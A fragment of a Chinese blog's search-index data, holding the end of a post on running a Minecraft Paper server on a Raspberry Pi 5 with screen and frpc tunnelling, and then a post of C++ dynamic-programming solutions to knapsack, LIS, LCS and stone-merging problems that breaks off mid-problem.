-e并作出如下修改:\n# 5 6  * * 1-5 bash auto/start_server.sh5 6 * * 1-5 export DISPLAY=:0 &amp;&amp; lxterminal -e &quot;bash auto/start_server.sh&quot;\n\n此外, 还要在原来的start_server.sh脚本的最后一行加上screen -r mc1.\n修改后的开服脚本如下:\n#!/bin/bash# 在后台创建screenscreen -dmS mc1screen -dmS frpc1screen -dmS frpc2# paper端screen -x -S mc1 -p 0 -X stuff &quot;cd paper$(printf \\\\r)&quot;screen -x -S mc1 -p 0 -X stuff &quot;/usr/local/jdk-21.0.5/bin/java -Xms5G -Xmx5G -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar paper-1.21.1.jar --nogui$(printf \\\\r)&quot;# 这里java用了全路径, 是因为脚本在某些场合执行的时候, 不会使用系统环境变量, 用全路径比较保险.# 注意, 这里的-Xms5G -Xmx5G和最后的paper-1.21.1.jar要根据你的实际情况修改!screen -d mc1# 内网穿透1screen -x -S frpc1 -p 0 -X stuff &quot;cd natfrp$(printf \\\\r)&quot;screen -x -S frpc1 -p 0 -X stuff &quot;./frpc -f xxxx:xxxx$(printf \\\\r)&quot;# 这里的-f xxxx:xxxx修改为你自己的配置信息, 下同screen -d frpc1# 内网穿透2screen -x -S frpc2 -p 0 -X stuff &quot;cd natfrp$(printf \\\\r)&quot;screen -x -S frpc2 -p 0 -X stuff &quot;./frpc -f yyyy:yyyy$(printf \\\\r)&quot;screen -d frpc2# 内网穿透3screen -x -S frpc3 -p 0 -X stuff &quot;cd natfrp$(printf \\\\r)&quot;screen -x -S frpc3 -p 0 -X stuff &quot;./frpc -f zzzz:zzzz$(printf \\\\r)&quot;screen -d frpc3# 恢复 mc1 会话screen -r mc1\n\n\n树莓派5开服性能以下数据可供参考.\n在分配了6 GB内存、原版服务器(只装了一些不影响玩法的功能插件)的情况下:\n\n游戏人数在12人左右时, 仍有较流畅的游玩体验.\n服务器功耗在2.9W ~ 6.1W波动, 平均差不多4.5W的样子.\n装甲被动散热, 没有装风扇, 未出现过热现象.\n\n","categories":["杂项"],"tags":["树莓派","Minecraft"]},{"title":"程序设计实践 Week3 解题记录","url":"/2025/07/12/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5-Week3-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"前言这周是 DP (Dynamic Programming, 动态规划) 入门.\n因为 DP 是我的弱项, 所以这周的题目不再是选讲, 每题不论难易我都写了题解. 因为都是经典题目, 所以就不贴传送门了.\n在进入题解环节前, 先聊聊我是如何理解 DP 的.\n我对 DP 的个人理解是, 其核心思想在于将复杂问题分解为子问题, 这点和分治有点像, 但 DP 和分治不同的点在于, 分治的子问题往往是独立的 (比如归并排序, 分段之后左右两段的合并互不影响), 但 DP 面对的是大量重复的子问题 (以最简单的计算斐波那契数列为例, 计算 F(10) 需要 F(9) 和 F(8), 计算 F(9) 也需要 F(8), F(8) 被重复计算了), 此外, DP 往往还具有最优子结构, 即我们可以通过组合子问题的最优解来得到原问题的最优解, “状态转移方程” 就是最优子结构的数学体现. 此外, DP 还有一个重要的隐含前提, 就是无后效性, 也就是说, 一旦某个状态在当前确定了, 它就不能再被之后的阶段决策所影响.\n(当然, 有些比较高级的 DP 可能并没有上述这样优良的性质, 不过这不在我们的讨论范围内, 因为我太菜了.)\n总结一下, DP的本质就是: 利用最优子结构特性, 通过状态转移方程从子问题的解推导出全局解; 同时利用重叠子问题特性, 通过记忆化或列表法优化计算过程.\n基于上面的本质, 我们可以得到 DP 问题的解题框架:\n\n定义子问题 (状态). 一般是用数组 dp[i][j][...] 来表示, 其中  等是用于决策的变量.\n寻找状态转移方程. 这是 DP 的核心, 我很难总结出一套寻找状态转移方程的方法, 感觉更多都是 “瞪眼法” , 可能多做题就会了吧.\n确定边界条件 (初始状态). 状态转移需要一个起点, 一般由题目初始条件给定.\n提取答案. 从 dp 表中找出题目所要的答案, 没啥好多说的.\n\n此篇文章的大部分题解都是按照这个框架写的.\n1. 数字三角形\n  \n    \n      题意简述\n\n    \n    \n      观察下面的数字金字塔。\n写一个程序来查找从最高点到底部任意处结束的路径，使路径经过数字的和最大。每一步可以走到左下方的点也可以到达右下方的点。\n\n在上面的样例中，从  的路径产生了最大权值。\n\n    \n  \n\n\n    Solution \n    \n      记 a[i][j]: 第  行, 从左往右第  个数字.记 f[i][j]: 从  走到  的路径最大权值. 并令 f[i][0] = 0.\n显然有:\n\nf[1][1] = a[1][1] \nf[i][j] = a[i][j] + max(f[i-1][j], f[i-1][j-1]) \n\n时间复杂度  , 应该无法更优了.\n代码略.\n\n    \n  \n\n\n2. 林克的01背包\n  \n    \n      题意简述\n\n    \n    \n      给定  个物品和背包容量  , 每个物品具有体积  与价值 , 每个物品至多选一次, 求背包最多可以装多少价值的物品.\n\n    \n  \n\n\n    Solution \n    \n      考虑子问题: 只取前  个物品, 用容量为  的背包, 最多可以凑出多少价值?\n把这个子问题的答案记为 f[i][j] , 显然最终答案就是 f[N][M] .\n接下来考虑转移, 显然, f[i][j] 由 f[i-1][*] 拓展而来, 若选择第  个物品, 就有: f[i][j] = f[i-1][j - v[i]] + w[i], 若不选第  个物品, 就有: f[i][j] = f[i-1][j].\n于是, f[i][j] = max(f[i-1][j - v[i]] + w[i], f[i-1][j]) .\n可以发现, f[i][*] 只与 f[i-1][*] 有关, 且当我们处理到  时,  已经处理好了, 所以这个数组的第一维其实是没用的, 我们可以直接用 f[j] 表示处理完当前物品后容量为  的背包可装下的最大价值.\n和上面一样, f[j] = max(f[j - v[i]] + w[i], f[j]) .\n时间复杂度  .空间复杂度  .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;int n, m;int v[1005], w[1005];int f[1005];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch ^ 48);    return f ? x : -x;}int max(int a, int b){return a &gt; b ? a : b;}int main(){\tn = read(), m = read();\tfor(int i = 1; i &lt;= n; ++i) v[i] = read(), w[i] = read();\tfor(int i = 1; i &lt;= n; ++i){\t\tfor(int j = m; j &gt;= v[i]; --j){\t\t\tf[j] = max(f[j], f[j - v[i]] + w[i]);\t\t}\t}\tprintf(\"%d\\n\", f[m]);}\n\n    \n  \n\n\n3. 林克的完全背包\n  \n    \n      题意简述\n\n    \n    \n      给定  个物品和背包容量  , 每个物品具有体积  与价值 , 每个物品无限件, 求背包最多可以装多少价值的物品.\n\n    \n  \n\n\n    Solution \n    \n      和上一道 01背包 不一样了, 这题的物品不再是考虑 “选或不选” 这样的 “01” 选择, 而是要考虑每个物品的选择个数.\n因此, 一个很朴素的想法是, 对于每个物品, 我都再加一层 for 循环来枚举它的选择个数. 这样的时间复杂度是  的.\n像上一题一样, 还是设 f[i][j] 表示只取前  个物品, 用容量为  的背包可凑出的最大价值.\n于是, f[i][j] = max(f[i-1][j - v[i] * k] + w[i] * k) , 其中 k 表示第  个物品的选择个数.\n让我们思考一下, 我们真的需要枚举每个物品的选择个数 k 吗 ?\n如果我们从小的  往大的  转移, 当我再考虑能否从 j - v[i] 转移到 j 的时候, j - v[i] * 2 能否转移到 j - v[i] 这个子问题必然已经被决策过了, 并且已经被记录到了 j - v[i] 这个状态中, 也就是说, 我们根本不需要用 j - v[i] * 2, j - v[i] * 3 … 来转移到 j, 因为这些情况已经被 j - v[i] 考虑过了! 它们属于重叠的子问题.\n考虑完物品的个数, 再来考虑物品与物品间的转移, 容易发现这时的问题情景和01背包是一样的, 同样能够用滚动数组来减少一维状态. 完全背包问题 与 01背包问题 唯一的区别只有 j 的转移方向.\n这样, 我们就把完全背包问题的时间复杂度降低到了  , 空间复杂度降低到了  .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;int n, m;int v[1005], w[1005];int f[1005];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch ^ 48);    return f ? x : -x;}int max(int a, int b){return a &gt; b ? a : b;}int main(){\tn = read(), m = read();\tfor(int i = 1; i &lt;= n; ++i) v[i] = read(), w[i] = read();\tfor(int i = 1; i &lt;= n; ++i){\t\tfor(int j = v[i]; j &lt;= m; ++j){ // 只有枚举顺序的变化.\t\t\tf[j] = max(f[j], f[j - v[i]] + w[i]);\t\t}\t}\tprintf(\"%d\\n\", f[m]);}\n\n    \n  \n\n\n4 &amp; 5. 多重背包问题(1) &amp; 多重背包问题(2)\n  \n    \n      题意简述\n\n    \n    \n      给定  个物品和背包容量  , 每个物品具有体积  、价值  以及件数 , 求背包最多可以装多少价值的物品.\n\n    \n  \n\n\n    Solution \n    \n      首先还是和完全背包的朴素做法一样, 去枚举每个物品的使用次数, 相当于把  件相同物品当成不同物品, 然后用 01背包来解决, 时间复杂度  . 这个时间复杂度的算法可以通过问题(1).\n接下来考虑优化方式.\n上面的做法有非常明显的问题, 如果我把第  个物品拆成  件, 那么同时选物品  和  与同时选物品  和  是等价的, 都是选  件第  个物品, 但类似的相同问题却被反复地考虑了.\n我们肯定是不希望重复计算, 就要想办法来消除这种重复计算.\n其实, 我们只关心第  个物品选几件, 而非第  个物品的第  件物品选还是不选.\n为了保证第  个物品取  件的这  种情况能全部被考虑到, 我们就需要找到一种  的拆分方式, 满足:\n\n , 都可以通过  的部分和来得到  .\n不难发现, 只需对  进行二进制拆分即可, 比如:\n\n像这样拆分即可. 然后再对拆分后的物品做 01背包.\n时间复杂度  .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;int n, m, cnt;int v[1005], w[1005], s[1005];int V[100005];int W[100005];int f[100005];int read(){\tint x = 0, f = 1; char ch = getchar();\tfor(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');\tfor(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);\treturn f ? x : -x;}int max(int a, int b){return a &gt; b? a : b;}int main(){\tn = read(); m = read();\tfor(int i = 1; i &lt;= n; ++i){\t\tv[i] = read();\t\tw[i] = read();\t\ts[i] = read();\t}\t// 二进制拆分\tfor(int i = 1; i &lt;= n; ++i){\t\tint c = 1;\t\twhile(s[i] &gt; c){\t\t\ts[i] -= c;\t\t\tW[++cnt] = c * w[i];\t\t\tV[cnt] = c * v[i];\t\t\tc &lt;&lt;= 1;\t\t}\t\tW[++cnt] = s[i] * w[i];\t\tV[cnt] = s[i] * v[i];\t}\tfor(int i = 1; i &lt;= cnt; ++i){\t\tfor(int j = m; j &gt;= V[i]; --j){\t\t\tf[j] = max(f[j], f[j - V[i]] + W[i]);\t\t}\t}\tprintf(\"%d\\n\", f[m]);\treturn 0;}\n\n    \n  \n\n\n6. 分组背包问题\n  \n    \n      题意简述\n\n    \n    \n      给定  组物品和背包容量  , 每组物品有  个, 第  组 第  件物品的体积为  , 价值为  , 每组物品只能选至多一件物品, 求背包最多可以装多少价值的物品.\n\n    \n  \n\n\n    Solution \n    \n      既然是每组物品只能选至多一件物品, 那就对每组物品都做一个01背包.\n为了保证只选至多一件物品, 对于当前组, 先从大到小枚举背包体积  , 再枚举第  件物品.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;int n, m;int cnt[105];int v[105][105];int w[105][105];int f[105];int read(){\tint x = 0, f = 1; char ch = getchar();\tfor(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');\tfor(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);\treturn f ? x : -x;}int max(int a, int b){return a &gt; b? a : b;}int main(){\tn = read(), m = read();\tfor(int i = 1; i &lt;= n; ++i){\t\tcnt[i] = read();\t\tfor(int j = 1; j &lt;= cnt[i]; ++j){\t\t\tv[i][j] = read(), w[i][j] = read(); \t\t}\t}\tfor(int k = 1; k &lt;= n; ++k){ // 哪一组\t\tfor(int i = m; ~i; --i){ // 背包体积\t\t\tfor(int j = 1; j &lt;= cnt[k]; ++j){ // 对每个物品进行决策\t\t\t\tif(i &gt;= v[k][j])\t\t\t\t\tf[i] = max(f[i], f[i-v[k][j]] + w[k][j]);\t\t\t}\t\t}\t}\tprintf(\"%d\\n\", f[m]);\treturn 0;}\n\n    \n  \n\n\n7. 混合背包问题\n  \n    \n      题意简述\n\n    \n    \n      有  种物品和一个容量是  的背包.\n物品一共有三类:\n\n第一类物品只能用  次（01背包）；\n第二类物品可以用无限次（完全背包）；\n第三类物品最多只能用  次（多重背包）；\n\n物品体积是 ，价值是 。\n求背包最多可以装多少价值的物品.\n\n    \n  \n\n\n    Solution \n    \n      对前面三种背包类型题的综合应用.\n只需要在枚举物品的时候, 根据物品的类型, 使用对应的状态转移方程即可.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;int n, m;int s[1005], v[1005], w[1005];int f[1005];int read(){\tint x = 0, f = 1; char ch = getchar();\tfor(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');\tfor(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);\treturn f ? x : -x;}int max(int a, int b){return a &gt; b? a : b;}int main(){\tn = read(), m = read();\tfor(int i = 1; i &lt;= n; ++i){\t\tv[i] = read(), w[i] = read(), s[i] = read();\t}\tfor(int i = 1; i &lt;= n; ++i){\t\tif(s[i] == -1){ // 01 背包\t\t\tfor(int j = m; j &gt;= v[i]; --j) f[j] = max(f[j], f[j-v[i]] + w[i]);\t\t}\t\telse if(s[i] == 0){ // 完全背包\t\t\tfor(int j = v[i]; j &lt;= m; ++j) f[j] = max(f[j], f[j-v[i]] + w[i]);\t\t}\t\telse{ // 多重背包\t\t\tfor(int j = m; j &gt;= v[i]; --j){\t\t\t\tfor(int k = 1; j &gt;= k * v[i] and k &lt;= s[i]; ++k){\t\t\t\t\tf[j] = max(f[j], f[j-k*v[i]] + k*w[i]);\t\t\t\t}\t\t\t}\t\t}\t}\tprintf(\"%d\\n\", f[m]);\treturn 0;}\n\n    \n  \n\n\n8. 摘花生\n  \n    \n      题意简述\n\n    \n    \n      给定一个  行,  列的网格, 每个格点有分数  . 从左上角走到右下角, 每次只能向下或向右走, 最大化走过的格点分数和.\n\n\n    \n  \n\n\n    Solution \n    \n      和数字三角形是一样的.\n记 f[i][j] 表示走到  的最大分数, 于是有如下转移方程:\n\n初始条件:  .\n答案:  .\n注意边界可能需要特殊的处理.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;int T, n, m;int a[105][105];int f[105][105];int read(){\tint x = 0, f = 1; char ch = getchar();\tfor(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');\tfor(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);\treturn f ? x : -x;}int max(int a, int b){return a &gt; b? a : b;}void solve(){\tmemset(f, 0, sizeof(f));\tn = read(); m = read();\tfor(int i = 1; i &lt;= n; ++i)\t\tfor(int j = 1; j &lt;= m; ++j)\t\t\ta[i][j] = read();\tf[1][1] = a[1][1];\tfor(int i = 1; i &lt;= n; ++i){\t\tfor(int j = 1; j &lt;= m; ++j){\t\t\tif(i == 1 and j == 1) continue;\t\t\tif(i == 1) f[i][j] = max(f[i][j], f[i][j-1] + a[i][j]);\t\t\tif(j == 1) f[i][j] = max(f[i][j], f[i-1][j] + a[i][j]);\t\t\tif(i &gt; 1 and j &gt; 1){\t\t\t\tf[i][j] = max(f[i][j], f[i-1][j] + a[i][j]);\t\t\t\tf[i][j] = max(f[i][j], f[i][j-1] + a[i][j]);\t\t\t}\t\t}\t}\tprintf(\"%d\\n\", f[n][m]);}int main(){\tT = read();\twhile(T--) solve();\treturn 0;}\n\n    \n  \n\n\n9. 最低通行费\n  \n    \n      题意简述\n\n    \n    \n      和上一题一样, 但这次是要最小化正方形网格图的分数和.\n\n    \n  \n\n\n    Solution \n    \n      状态转移方程把 max 改成 min 即可, 然后初始时 f[][] 要设为  .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;int T, n, m;int a[105][105];int f[105][105];int read(){\tint x = 0, f = 1; char ch = getchar();\tfor(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');\tfor(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);\treturn f ? x : -x;}int min(int a, int b){return a &lt; b? a : b;}void solve(){\tmemset(f, 0x3f, sizeof(f));//\tn = read(); m = read();\tn = m = read();\tfor(int i = 1; i &lt;= n; ++i)\t\tfor(int j = 1; j &lt;= m; ++j)\t\t\ta[i][j] = read();\tf[1][1] = a[1][1];\tfor(int i = 1; i &lt;= n; ++i){\t\tfor(int j = 1; j &lt;= m; ++j){\t\t\tif(i == 1 and j == 1) continue;\t\t\tif(i == 1) f[i][j] = min(f[i][j], f[i][j-1] + a[i][j]);\t\t\tif(j == 1) f[i][j] = min(f[i][j], f[i-1][j] + a[i][j]);\t\t\tif(i &gt; 1 and j &gt; 1){\t\t\t\tf[i][j] = min(f[i][j], f[i-1][j] + a[i][j]);\t\t\t\tf[i][j] = min(f[i][j], f[i][j-1] + a[i][j]);\t\t\t}\t\t}\t}\tprintf(\"%d\\n\", f[n][m]);}int main(){//\tT = read();\tT = 1;\twhile(T--) solve();\treturn 0;}\n\n    \n  \n\n\n10 &amp; 11. 最长上升子序列 &amp; 最长上升子序列(2)\n  \n    \n      题意简述\n\n    \n    \n      给定一个长度为  的数列 , 求数值严格单调递增的子序列的长度最长是多少.\n\n    \n  \n\n\n    Solution \n    \n      设 f[i] 表示以 A[i] 结尾的最长上升子序列的长度.\n然后, 要求  的时候, 我们就回头找  , 如果  , 就尝试把  放到这个子序列的后面, 也就是令  .\n很容易写出这个思路对应的状态转移方程:\n .\n时间复杂度  .\n参考代码:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;int n;int a[1005];int f[1005]; // 以 f[i] 结尾的最长上升子序列的长度int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int max(int a, int b){return a &gt; b? a : b;}int main(){\tn = read();\tfor(int i = 1; i &lt;= n; ++i) a[i] = read(), f[i] = 1;\tint ans = 1;\tfor(int i = 2; i &lt;= n; ++i){\t\tfor(int j = 1; j &lt; i; ++j){\t\t\tif(a[j] &lt; a[i]) f[i] = max(f[i], f[j] + 1);\t\t}\t\tans = max(ans, f[i]);\t}\tprintf(\"%d\\n\", ans);}\n\n其实我的第一反应并不是这样.\n题目要求最长上升子序列, 那我们就直接维护最长上升子序列 不就行了 ?\n用 f[k] 表示长度为 k 的最长上升子序列的末尾元素最小值. 那么, f[k] 必然是一个单调递增的数组.\n从左到右扫描  , 如果  大于  , 说明  能够加在原来以  结尾的最长上升子序列的后面, 于是令  .\n否则, 就尝试用  更新原来的 . 我们需要找到  中的一个位置 , 这个位置满足:\n比原来的更优是第一个可被更新的元素\n怎么找这个  呢? 因为  是单调递增的, 所以可以直接二分查找, 用 lower_bound 即可.\n时间复杂度  .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;int n;int a[100005];int f[100005];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch ^ 48);    return f ? x : -x;}int max(int a, int b){return a &gt; b? a : b;}int main(){\tn = read();\tfor(int i = 1; i &lt;= n; ++i) a[i] = read();\tf[1] = a[1]; int len = 1;\tfor(int i = 2; i &lt;= n; ++i){\t\tif(a[i] &gt; f[len]) f[++len] = a[i];\t\telse *std::lower_bound(&amp;f[1], &amp;f[len+1], a[i]) = a[i];\t}\tprintf(\"%d\\n\", len);}\n\n    \n  \n\n\n12. 拦截导弹\n  \n    \n      题目描述\n\n    \n    \n      某国为了防御敌国的导弹袭击，发展出一种导弹拦截系统。但是这种导弹拦截系统有一个缺陷：虽然它的第一发炮弹能够到达任意的高度，但是以后每一发炮弹都不能高于前一发的高度。某天，雷达捕捉到敌国的导弹来袭。由于该系统还在试用阶段，所以只有一套系统，因此有可能不能拦截所有的导弹。\n输入导弹依次飞来的高度，计算这套系统最多能拦截多少导弹，如果要拦截所有导弹最少要配备多少套这种导弹拦截系统。\n简述一下题意:\n给定一个长为  的序列 , 求:\n\n最长不下降子序列的长度;\n覆盖整个序列的不下降子序列的最少个数.\n\n\n    \n  \n\n\n    Solution \n    \n      对于第一问, 我们依旧是用求最长上升子序列的方法, 用 f[k] 表示长度为 k 的最长不下降子序列的末尾元素最大值. 那么, f[k] 必然是一个单调不减的数组.\n依旧是从左到右扫描  , 如果  小于等于  , 说明  能够加在原来以  结尾的最长不下降序列的后面, 于是令  .\n否则, 就尝试用  更新原来的 . 我们需要找到  中的一个位置 , 这个位置满足:\n比原来的更优是第一个可被更新的元素\n最后的  就是最长不下降子序列的最大长度.\n再来看看这个令人头疼的第二问, 这里需要用到 Dilworth 定理:\n「偏序集能划分成的最少的全序集个数等于最大反链的元素个数.」\n\n也就是:\n[覆盖整个序列的最长不下降子序列的最少个数] 等于 [最长上升子序列的长度].\n定理的详细介绍请翻阅 OI-Wiki, 我这里不展开, 直接当结论用.\n知道这个结论, 这道题就容易解决了. 分别求最长不下降子序列的长度和最长上升子序列的长度即可.\n时间复杂度  .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#define N 30005int n, len1, len2;int a[N];int LNDS[N], LIS[N];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int&amp; bsearch(int l, int r, int x){    int res = l;    while(l &lt;= r){        int mid = (l + r) &gt;&gt; 1;        if(LNDS[mid] &lt; x) res = mid, r = mid - 1;        else l = mid + 1;    }    return LNDS[res];}int main(){    while(~scanf(\"%d\", &amp;a[n+1])) ++n;    len1 = 1, len2 = 1;    LNDS[1] = a[1];    LIS[1] = a[1];    for(int i = 2; i &lt;= n; ++i){        // 处理最长不下降子序列        if(LNDS[len1] &gt;= a[i]) LNDS[++len1] = a[i];        else bsearch(1, len1, a[i]) = a[i];        // 处理最长上升子序列        if(LIS[len2] &lt; a[i]) LIS[++len2] = a[i];        else *std::lower_bound(&amp;LIS[1], &amp;LIS[len2+1], a[i]) = a[i];    }    printf(\"%d\\n%d\\n\", len1, len2);}\n\n    \n  \n\n\n13. 最长公共子序列\n  \n    \n      题意简述\n\n    \n    \n      给定两个长度分别为  和  的字符串 A 和 B ，求既是 A 的子序列又是 B 的子序列的字符串长度最长是多少。\n\n    \n  \n\n\n    Solution \n    \n      记 f[i][j] 表示以 A[i] , B[j] 为结尾的最长公共子序列的长度.\n转移方程:\n\n用变量 ans 记录 f[i][j] 中的最大值, 此即为最长公共子序列的长度.\n时间复杂度  .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;iostream&gt;int n, m, ans;char A[1003];char B[1003];int f[1003][1003]; // f[i][j]: 以 A[i] 和 B[j] 结尾的最长公共子序列的长度int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch ^ 48);    return f ? x : -x;}int max(int a, int b){return a &gt; b? a : b;}int main(){\tn = read(), m = read();\tstd::cin &gt;&gt; A + 1 &gt;&gt; B + 1;\tfor(int i = 1; i &lt;= n; ++i){\t\tfor(int j = 1; j &lt;= m; ++j){\t\t\tif(A[i] == B[j]) f[i][j] = f[i-1][j-1] + 1;\t\t\telse f[i][j] = max(f[i-1][j], f[i][j-1]);\t\t\tans = max(ans, f[i][j]);\t\t}\t}\tprintf(\"%d\\n\", ans);}\n\n    \n  \n\n\n14. 石子合并\n  \n    \n      题意简述\n\n    \n    \n      设有  堆石子排成一排，其编号为 。每堆石子有一定的质量 。现在要将这  堆石子合并成为一堆。每次只能合并相邻的两堆，合并的代价为这两堆石子的质量之和，合并后与这两堆石子相邻的石子将和新堆相邻。合并时由于选择的顺序不同，合并的总代价也不相同。试找出一种合理的方法，使总的代价最小，并输出最小代价。\n\n    \n  \n\n\n    Solution \n    \n      如果是合并任意两堆, 那就是贪心, 也就是构造 Huffman 树.\n但如果是合并相邻两堆, 那就是 区间DP 了.\n设 f[i][j] 表示将区间  合并为一堆, 所需的最小代价.\n那么, 就枚举这个区间里的某堆石子  表示 “分隔点”, 即表示区间  由区间  与  合并而来.\n很容易得到状态转移方程:\n其中表示前缀和\n接下来要思考转移顺序.\n显然, 大区间由小区间合并而来, 所以我们要先计算出小区间, 再计算大区间.\n所以, 以  作为阶段, 先从小到大枚举  , 再枚举  , 计算出  后再枚举  进行转移.\n初始条件:  .答案即为:  .\n时间复杂度  .\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#define N 302int n;int a[N];int sum[N];int f[N][N];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int min(int a, int b){return a &lt; b? a : b;}int main(){    memset(f, 0x3f, sizeof(f));    n = read();    for(int i = 1; i &lt;= n; ++i) a[i] = read(), f[i][i] = 0, sum[i] = sum[i-1] + a[i];    for(int len = 2; len &lt;= n; ++len){        for(int i = 1; i &lt;= n - len + 1; ++i){            int j = i + len - 1;            for(int k = i; k &lt; j; ++k){                f[i][j] = min(f[i][j], f[i][k] + f[k+1][j] + sum[j] - sum[i-1]);            }        }    }    printf(\"%d\\n\", f[1][n]);    return 0^(0-0)^0;}\n\n    \n  \n\n\n15. 环形石子合并\n  \n    \n      题意简述\n\n    \n    \n      在一个圆形操场的四周摆放  堆石子，现要将石子有次序地合并成一堆，规定每次只能选相邻的  堆合并成新的一堆，并将新的一堆的石子数，记为该次合并的得分。\n试设计出一个算法,计算出将  堆石子合并成  堆的最小得分和最大得分。\n\n    \n  \n\n\n    Solution \n    \n      上一题是区间为链的情况, 这一题是区间为环的情况.\n最直接的想法就是把环变成链.\n我能想到的做法有这两种:\n\n枚举把环切开的位置, 切开后就是上一道题的情况了, 由于有  种分开环的方法, 所以时间复杂度是  .\n把原来的链复制一遍, 即在原来链的基础上, 令  , 对这个长为  的链做区间DP, 最后的答案即为  中的最大值和最小值. 时间复杂度是  .\n\n我选择第二种倍长链的做法.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#define N 202int n;int a[N &lt;&lt; 1];int sum[N &lt;&lt; 1];int fmin[N &lt;&lt; 1][N &lt;&lt; 1];int fmax[N &lt;&lt; 1][N &lt;&lt; 1];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int min(int a, int b){return a &lt; b? a : b;}int max(int a, int b){return a &gt; b? a : b;}int main(){    memset(fmin, 0x3f, sizeof(fmin));    memset(fmax, -0x3f, sizeof(fmax));    n = read();    for(int i = 1; i &lt;= n; ++i) a[i] = read(), a[i+n] = a[i];    for(int i = 1; i &lt;= n &lt;&lt; 1; ++i) sum[i] = sum[i-1] + a[i], fmin[i][i] = 0, fmax[i][i] = 0;    for(int len = 2; len &lt;= n; ++len){        for(int i = 1; i &lt;= (n &lt;&lt; 1) - len + 1; ++i){            int j = i + len - 1;            for(int k = i; k &lt; j; ++k){                fmin[i][j] = min(fmin[i][j], fmin[i][k] + fmin[k+1][j] + sum[j] - sum[i-1]);                fmax[i][j] = max(fmax[i][j], fmax[i][k] + fmax[k+1][j] + sum[j] - sum[i-1]);            }        }    }    fmin[0][0] = 0x3f3f3f3f, fmax[0][0] = -0x3f3f3f3f;    for(int i = 1; i &lt;= n; ++i){        fmin[0][0] = min(fmin[0][0], fmin[i][i+n-1]);        fmax[0][0] = max(fmax[0][0], fmax[i][i+n-1]);    }    printf(\"%d\\n%d\\n\", fmin[0][0], fmax[0][0]);    return 0^(0-0)^0;}\n\n    \n  \n\n\n16. 加分二叉树\n  \n    \n      题意简述\n\n    \n    \n      设一个  个节点的二叉树  的中序遍历为，其中数字  为节点编号。每个节点都有一个分数（均为正整数），记第  个节点的分数为 ， 及它的每个子树都有一个加分，任一棵子树 （也包含  本身）的加分计算方法如下：\n 的左子树的加分   的右子树的加分   